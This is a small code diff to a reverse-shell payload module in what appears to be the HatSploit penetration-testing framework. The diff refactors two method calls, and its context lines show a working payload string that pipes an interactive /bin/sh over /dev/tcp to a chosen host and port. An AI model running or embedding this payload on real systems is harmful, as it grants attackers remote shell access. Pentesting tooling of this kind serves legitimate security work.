@@ -68,9 +68,9 @@ class HatSploitPayload(HatSploitPayload, TCPClient):
     }
 
     def run(self):
-        local_host, local_port, prompt = self.parser.parse_options(self.options)
+        local_host, local_port, prompt = self.parse_options(self.options)
 
-        self.badges.output_process("Generating payload...")
+        self.output_process("Generating payload...")
 
         if prompt in ['yes', 'y']:
             payload = f"/bin/sh -i &>/dev/tcp/{local_host}/{local_port} 0>&1 &"
